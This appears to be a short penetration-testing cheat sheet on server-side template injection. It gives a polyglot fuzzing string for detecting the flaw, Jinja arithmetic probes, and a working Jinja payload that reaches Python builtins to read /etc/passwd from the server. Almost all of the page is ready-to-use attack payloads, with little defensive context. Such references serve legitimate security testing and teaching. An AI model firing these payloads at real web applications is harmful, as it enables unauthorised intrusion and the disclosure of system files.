---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SSTI (Server Side Template Injection)

## Identify the vulnerability

_<mark style="color:green;">Polyglot</mark>_ is commonly used in template expressions fuzzing. If an error occurs it might be vulnerable and also can be to identify the template engine in use.

```
${{<%[%'"}}%\.
```

## Basic Injection

### Jinja - mathematical equation

```django
{{7*7}}
{{7*'7'}}
{{4*4}}[[5*5]]
```

### Jinja - file read

```django
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
